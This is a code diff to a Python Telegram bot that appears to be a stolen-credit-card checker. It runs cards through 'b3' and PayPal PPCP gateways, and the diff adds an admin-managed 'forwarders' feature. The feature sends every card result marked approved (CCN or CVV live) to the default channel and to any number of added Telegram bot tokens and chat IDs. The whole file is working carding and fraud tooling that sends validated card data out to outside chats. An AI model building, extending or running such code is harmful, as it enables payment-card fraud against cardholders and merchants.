@@ -49,6 +49,10 @@ USER_DB_LOCK_FILE = 'users_db.json.lock'
 SITE_FREEZE_FILE = 'site_freeze_state.json'
 SITE_FREEZE_LOCK_FILE = 'site_freeze_state.json.lock'
 
+# Forwarders database file
+FORWARDERS_DB_FILE = 'forwarders_db.json'
+FORWARDERS_DB_LOCK_FILE = 'forwarders_db.json.lock'
+
 # Channel ID for forwarding approved cards
 CHANNEL_ID = None
 
@@ -104,6 +108,68 @@ def save_site_freeze_state(state):
     with lock:
         with open(SITE_FREEZE_FILE, 'w') as f:
             json.dump(state, f, indent=2)
+
+def load_forwarders_db():
+    """Load forwarders database from file with file locking for thread safety"""
+    lock = SoftFileLock(FORWARDERS_DB_LOCK_FILE, timeout=10)
+    with lock:
+        if os.path.exists(FORWARDERS_DB_FILE):
+            try:
+                with open(FORWARDERS_DB_FILE, 'r') as f:
+                    return json.load(f)
+            except:
+                return {'b3': [], 'pp': []}
+        return {'b3': [], 'pp': []}
+
+def save_forwarders_db(db):
+    """Save forwarders database to file with file locking for thread safety"""
+    lock = SoftFileLock(FORWARDERS_DB_LOCK_FILE, timeout=10)
+    with lock:
+        with open(FORWARDERS_DB_FILE, 'w') as f:
+            json.dump(db, f, indent=2)
+
+def add_forwarder(gateway, name, bot_token, chat_id):
+    """Add a new forwarder"""
+    db = load_forwarders_db()
+    forwarder = {
+        'name': name,
+        'bot_token': bot_token,
+        'chat_id': chat_id,
+        'enabled': True
+    }
+    db[gateway].append(forwarder)
+    save_forwarders_db(db)
+    return True
+
+def remove_forwarder(gateway, index):
+    """Remove a forwarder by index"""
+    db = load_forwarders_db()
+    if 0 <= index < len(db[gateway]):
+        db[gateway].pop(index)
+        save_forwarders_db(db)
+        return True
+    return False
+
+def update_forwarder(gateway, index, name=None, bot_token=None, chat_id=None, enabled=None):
+    """Update a forwarder"""
+    db = load_forwarders_db()
+    if 0 <= index < len(db[gateway]):
+        if name is not None:
+            db[gateway][index]['name'] = name
+        if bot_token is not None:
+            db[gateway][index]['bot_token'] = bot_token
+        if chat_id is not None:
+            db[gateway][index]['chat_id'] = chat_id
+        if enabled is not None:
+            db[gateway][index]['enabled'] = enabled
+        save_forwarders_db(db)
+        return True
+    return False
+
+def get_forwarders(gateway):
+    """Get all forwarders for a gateway"""
+    db = load_forwarders_db()
+    return db.get(gateway, [])
 
 def load_mods_db():
     """Load mods database from file with file locking for thread safety"""
@@ -1002,27 +1068,53 @@ async def check_ppcp_cards_streaming(card_list, site_urls, on_result_callback, m
 
 # ============= TELEGRAM BOT HANDLERS =============
 
-async def forward_to_channel(context: ContextTypes.DEFAULT_TYPE, card_details: str, result: str):
-    """Forward approved card to the configured channel"""
-    if FORWARD_CHANNEL_ID is None:
-        return  # Forwarding disabled
-
-    try:
-        # Check if the result indicates an approved card
-        # For auth gateway: "APPROVED" and "✅"
-        # For PPCP gateway: "CCN" or "CVV" with "✅"
-        if ("APPROVED" in result and "✅" in result) or \
-           ("CCN" in result and "✅" in result) or \
-           ("CVV" in result and "✅" in result):
-            # Send the result to the channel
+async def forward_to_channel(context: ContextTypes.DEFAULT_TYPE, card_details: str, result: str, gateway='b3'):
+    """Forward approved card to the configured channel and all enabled forwarders"""
+    # Check if the result indicates an approved card
+    # For auth gateway: "APPROVED" and "✅"
+    # For PPCP gateway: "CCN" or "CVV" with "✅"
+    is_approved = ("APPROVED" in result and "✅" in result) or \
+                  ("CCN" in result and "✅" in result) or \
+                  ("CVV" in result and "✅" in result)
+    
+    if not is_approved:
+        return
+    
+    # Forward to default channel if configured
+    if FORWARD_CHANNEL_ID is not None:
+        try:
             await context.bot.send_message(
                 chat_id=FORWARD_CHANNEL_ID,
                 text=result,
                 parse_mode=None
             )
-            print(f"✅ Forwarded approved card to channel: {FORWARD_CHANNEL_ID}")
-    except Exception as e:
-        print(f"❌ Error forwarding to channel: {str(e)}")
+            print(f"✅ Forwarded approved card to default channel: {FORWARD_CHANNEL_ID}")
+        except Exception as e:
+            print(f"❌ Error forwarding to default channel: {str(e)}")
+    
+    # Forward to all enabled forwarders for this gateway
+    forwarders = get_forwarders(gateway)
+    for forwarder in forwarders:
+        if not forwarder.get('enabled', True):
+            continue
+        
+        try:
+            # Create a temporary bot instance for this forwarder
+            import aiohttp
+            url = f"https://api.telegram.org/bot{forwarder['bot_token']}/sendMessage"
+            data = {
+                'chat_id': forwarder['chat_id'],
+                'text': result
+            }
+            
+            async with aiohttp.ClientSession() as session:
+                async with session.post(url, data=data, timeout=10) as response:
+                    if response.status == 200:
+                        print(f"✅ Forwarded to forwarder '{forwarder['name']}' (chat: {forwarder['chat_id']})")
+                    else:
+                        print(f"❌ Failed to forward to forwarder '{forwarder['name']}': HTTP {response.status}")
+        except Exception as e:
+            print(f"❌ Error forwarding to forwarder '{forwarder['name']}': {str(e)}")
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /start command"""
@@ -1140,7 +1232,7 @@ async def b3_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await checking_msg.edit_text(result)
     
     # Forward to channel if approved
-    await forward_to_channel(context, card_details, result)
+    await forward_to_channel(context, card_details, result, gateway='b3')
 
     # Handle error notifications
     if error_type:
@@ -1277,7 +1369,7 @@ async def b3s_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if "APPROVED" in result and "✅" in result:
             approved_count += 1
             # Forward to channel if approved
-            await forward_to_channel(context, card, result)
+            await forward_to_channel(context, card, result, gateway='b3')
         else:
             declined_count += 1
 
@@ -1424,7 +1516,7 @@ async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await checking_msg.edit_text(result)
 
             # Forward to channel if approved
-            await forward_to_channel(context, normalized_cards[0], result)
+            await forward_to_channel(context, normalized_cards[0], result, gateway='pp')
 
         except Exception as e:
             error_message = f"❌ Error checking card: {str(e)}"
@@ -1469,7 +1561,7 @@ async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if ("CCN" in result and "✅" in result) or ("CVV" in result and "✅" in result):
                 approved_count += 1
                 # Forward to channel if approved
-                await forward_to_channel(context, card, result)
+                await forward_to_channel(context, card, result, gateway='pp')
             else:
                 declined_count += 1
 
@@ -1676,6 +1768,12 @@ async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
             ],
             [
                 InlineKeyboardButton("🔗 PPCP Sites", callback_data='settings_ppcp_sites'),
+            ],
+            [
+                InlineKeyboardButton("📡 B3 Forwarders", callback_data='settings_forwarders_b3'),
+            ],
+            [
+                InlineKeyboardButton("📡 PP Forwarders", callback_data='settings_forwarders_pp'),
             ],
             [
                 InlineKeyboardButton("⏰ Auto-Scan Settings", callback_data='settings_auto_scan'),
@@ -1950,6 +2048,217 @@ async def settings_callback_handler(update: Update, context: ContextTypes.DEFAUL
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
+
+async def forwarders_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle forwarder settings callbacks"""
+    query = update.callback_query
+    
+    # Only answer if not already answered
+    try:
+        await query.answer()
+    except:
+        pass
+    
+    user_id = query.from_user.id
+    
+    # Check if user is admin or mod
+    if not is_admin_or_mod(user_id):
+        await query.edit_message_text("❌ This action is only available to admins and mods.")
+        return
+    
+    action = query.data
+    
+    # Determine gateway from action
+    if action.startswith('settings_forwarders_'):
+        gateway = action.replace('settings_forwarders_', '')
+        gateway_name = "B3" if gateway == "b3" else "PP"
+        
+        # Show forwarders list
+        forwarders = get_forwarders(gateway)
+        
+        keyboard = [
+            [InlineKeyboardButton("➕ Add Forwarder", callback_data=f'fwd_add_{gateway}')],
+        ]
+        
+        if forwarders:
+            for idx, fwd in enumerate(forwarders):
+                status = "🟢" if fwd.get('enabled', True) else "🔴"
+                keyboard.append([
+                    InlineKeyboardButton(f"{status} {fwd['name']}", callback_data=f'fwd_view_{gateway}_{idx}'),
+                    InlineKeyboardButton("🧪 Test", callback_data=f'fwd_test_{gateway}_{idx}')
+                ])
+        
+        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data='admin_settings')])
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_text(
+            f"📡 *{gateway_name} Forwarders*\\n\\nTotal: {len(forwarders)}\\n\\nSelect an option:",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    
+    elif action.startswith('fwd_add_'):
+        gateway = action.replace('fwd_add_', '')
+        gateway_name = "B3" if gateway == "b3" else "PP"
+        
+        # Store the gateway in user context for the next message
+        context.user_data['forwarder_action'] = 'add'
+        context.user_data['forwarder_gateway'] = gateway
+        context.user_data['forwarder_step'] = 'name'
+        
+        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data=f'settings_forwarders_{gateway}')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_text(
+            f"➕ *Add {gateway_name} Forwarder*\\n\\n"
+            "Step 1/3: Enter a custom name for this forwarder\\n"
+            "Example: My Channel",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    
+    elif action.startswith('fwd_view_'):
+        parts = action.split('_')
+        gateway = parts[2]
+        idx = int(parts[3])
+        gateway_name = "B3" if gateway == "b3" else "PP"
+        
+        forwarders = get_forwarders(gateway)
+        if idx >= len(forwarders):
+            await query.edit_message_text("❌ Forwarder not found.")
+            return
+        
+        fwd = forwarders[idx]
+        status = "🟢 Enabled" if fwd.get('enabled', True) else "🔴 Disabled"
+        
+        keyboard = [
+            [
+                InlineKeyboardButton("✏️ Edit Name", callback_data=f'fwd_edit_name_{gateway}_{idx}'),
+                InlineKeyboardButton("🔑 Edit Token", callback_data=f'fwd_edit_token_{gateway}_{idx}')
+            ],
+            [
+                InlineKeyboardButton("💬 Edit Chat ID", callback_data=f'fwd_edit_chat_{gateway}_{idx}'),
+                InlineKeyboardButton(f"{'🔴 Disable' if fwd.get('enabled', True) else '🟢 Enable'}", callback_data=f'fwd_toggle_{gateway}_{idx}')
+            ],
+            [
+                InlineKeyboardButton("🧪 Test", callback_data=f'fwd_test_{gateway}_{idx}'),
+                InlineKeyboardButton("🗑️ Remove", callback_data=f'fwd_remove_{gateway}_{idx}')
+            ],
+            [InlineKeyboardButton("⬅️ Back", callback_data=f'settings_forwarders_{gateway}')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        # Mask bot token for security
+        masked_token = fwd['bot_token'][:10] + "..." + fwd['bot_token'][-5:] if len(fwd['bot_token']) > 15 else "***"
+        
+        await query.edit_message_text(
+            f"📡 *{gateway_name} Forwarder: {fwd['name']}*\\n\\n"
+            f"Status: {status}\\n"
+            f"Bot Token: `{masked_token}`\\n"
+            f"Chat ID: `{fwd['chat_id']}`\\n\\n"
+            "Select an option:",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    
+    elif action.startswith('fwd_edit_'):
+        parts = action.split('_')
+        field = parts[2]
+        gateway = parts[3]
+        idx = int(parts[4])
+        gateway_name = "B3" if gateway == "b3" else "PP"
+        
+        # Store context for next message
+        context.user_data['forwarder_action'] = 'edit'
+        context.user_data['forwarder_gateway'] = gateway
+        context.user_data['forwarder_index'] = idx
+        context.user_data['forwarder_field'] = field
+        
+        field_names = {
+            'name': 'Name',
+            'token': 'Bot Token',
+            'chat': 'Chat ID'
+        }
+        
+        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data=f'fwd_view_{gateway}_{idx}')]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_text(
+            f"✏️ *Edit {field_names[field]}*\\n\\n"
+            f"Enter the new {field_names[field].lower()}:",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    
+    elif action.startswith('fwd_toggle_'):
+        parts = action.split('_')
+        gateway = parts[2]
+        idx = int(parts[3])
+        
+        forwarders = get_forwarders(gateway)
+        if idx >= len(forwarders):
+            await query.edit_message_text("❌ Forwarder not found.")
+            return
+        
+        current_status = forwarders[idx].get('enabled', True)
+        update_forwarder(gateway, idx, enabled=not current_status)
+        
+        # Refresh the view
+        await forwarders_callback_handler(update, context)
+    
+    elif action.startswith('fwd_remove_'):
+        parts = action.split('_')
+        gateway = parts[2]
+        idx = int(parts[3])
+        
+        forwarders = get_forwarders(gateway)
+        if idx >= len(forwarders):
+            await query.edit_message_text("❌ Forwarder not found.")
+            return
+        
+        fwd_name = forwarders[idx]['name']
+        remove_forwarder(gateway, idx)
+        
+        await query.answer(f"✅ Removed forwarder: {fwd_name}")
+        
+        # Go back to forwarders list
+        context.user_data['callback_query'] = query
+        query.data = f'settings_forwarders_{gateway}'
+        await forwarders_callback_handler(update, context)
+    
+    elif action.startswith('fwd_test_'):
+        parts = action.split('_')
+        gateway = parts[2]
+        idx = int(parts[3])
+        gateway_name = "B3" if gateway == "b3" else "PP"
+        
+        forwarders = get_forwarders(gateway)
+        if idx >= len(forwarders):
+            await query.answer("❌ Forwarder not found.", show_alert=True)
+            return
+        
+        fwd = forwarders[idx]
+        
+        # Send test message
+        test_message = f"🧪 Test message from {gateway_name} Forwarder\\n\\nForwarder: {fwd['name']}\\nThis is a test to verify the configuration."
+        
+        try:
+            import aiohttp
+            url = f"https://api.telegram.org/bot{fwd['bot_token']}/sendMessage"
+            data = {
+                'chat_id': fwd['chat_id'],
+                'text': test_message
+            }
+            
+            async with aiohttp.ClientSession() as session:
+                async with session.post(url, data=data, timeout=10) as response:
+                    if response.status == 200:
+                        await query.answer(f"✅ Test message sent successfully to {fwd['name']}!", show_alert=True)
+                    else:
+                        error_text = await response.text()
+                        await query.answer(f"❌ Failed to send test message: HTTP {response.status}", show_alert=True)
+        except Exception as e:
+            await query.answer(f"❌ Error: {str(e)}", show_alert=True)
 
 async def b3site_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle B3 site selection callbacks"""
@@ -2826,7 +3135,7 @@ async def mods_callback_handler(update: Update, context: ContextTypes.DEFAULT_TY
         )
 
 async def file_edit_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle incoming messages for file editing, PPCP site additions, and mod additions"""
+    """Handle incoming messages for file editing, PPCP site additions, mod additions, and forwarder management"""
     user_id = update.effective_user.id
     
     # Check if user is admin or mod
@@ -2836,6 +3145,89 @@ async def file_edit_message_handler(update: Update, context: ContextTypes.DEFAUL
     message_text = update.message.text
     if not message_text:
         return
+    
+    # Check for forwarder actions first
+    if 'forwarder_action' in context.user_data:
+        action = context.user_data.get('forwarder_action')
+        gateway = context.user_data.get('forwarder_gateway')
+        gateway_name = "B3" if gateway == "b3" else "PP"
+        
+        if action == 'add':
+            step = context.user_data.get('forwarder_step')
+            
+            if step == 'name':
+                # Store name and ask for bot token
+                context.user_data['forwarder_name'] = message_text.strip()
+                context.user_data['forwarder_step'] = 'token'
+                
+                await update.message.reply_text(
+                    f"➕ *Add {gateway_name} Forwarder*\\n\\n"
+                    f"Name: {message_text.strip()}\\n\\n"
+                    "Step 2/3: Enter the bot token\\n"
+                    "Example: 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz",
+                    parse_mode='Markdown'
+                )
+                return
+            
+            elif step == 'token':
+                # Store token and ask for chat ID
+                context.user_data['forwarder_token'] = message_text.strip()
+                context.user_data['forwarder_step'] = 'chat_id'
+                
+                await update.message.reply_text(
+                    f"➕ *Add {gateway_name} Forwarder*\\n\\n"
+                    f"Name: {context.user_data['forwarder_name']}\\n"
+                    f"Token: {message_text.strip()[:10]}...\\n\\n"
+                    "Step 3/3: Enter the chat ID\\n"
+                    "Example: -1001234567890 or @channelname",
+                    parse_mode='Markdown'
+                )
+                return
+            
+            elif step == 'chat_id':
+                # Create the forwarder
+                name = context.user_data['forwarder_name']
+                token = context.user_data['forwarder_token']
+                chat_id = message_text.strip()
+                
+                add_forwarder(gateway, name, token, chat_id)
+                
+                # Clear context
+                context.user_data.clear()
+                
+                await update.message.reply_text(
+                    f"✅ *Forwarder Added Successfully*\\n\\n"
+                    f"Name: {name}\\n"
+                    f"Gateway: {gateway_name}\\n"
+                    f"Chat ID: {chat_id}",
+                    parse_mode='Markdown'
+                )
+                return
+        
+        elif action == 'edit':
+            field = context.user_data.get('forwarder_field')
+            idx = context.user_data.get('forwarder_index')
+            
+            field_map = {
+                'name': 'name',
+                'token': 'bot_token',
+                'chat': 'chat_id'
+            }
+            
+            # Update the forwarder
+            kwargs = {field_map[field]: message_text.strip()}
+            update_forwarder(gateway, idx, **kwargs)
+            
+            # Clear context
+            context.user_data.clear()
+            
+            await update.message.reply_text(
+                f"✅ *Forwarder Updated Successfully*\\n\\n"
+                f"Field: {field.title()}\\n"
+                f"New Value: {message_text.strip()}",
+                parse_mode='Markdown'
+            )
+            return
     
     # Check for pending PPCP/mod actions first
     with pending_ppcp_actions_lock:
@@ -3150,6 +3542,7 @@ def main():
     application.add_handler(CallbackQueryHandler(admin_callback_handler, pattern=r'^admin_'))
     application.add_handler(CallbackQueryHandler(interval_callback_handler, pattern=r'^interval_'))
     application.add_handler(CallbackQueryHandler(settings_callback_handler, pattern=r'^settings_'))
+    application.add_handler(CallbackQueryHandler(forwarders_callback_handler, pattern=r'^fwd_'))
     application.add_handler(CallbackQueryHandler(b3site_callback_handler, pattern=r'^b3site_'))
     application.add_handler(CallbackQueryHandler(b3file_callback_handler, pattern=r'^b3file_'))
     application.add_handler(CallbackQueryHandler(b3edit_callback_handler, pattern=r'^b3edit_'))
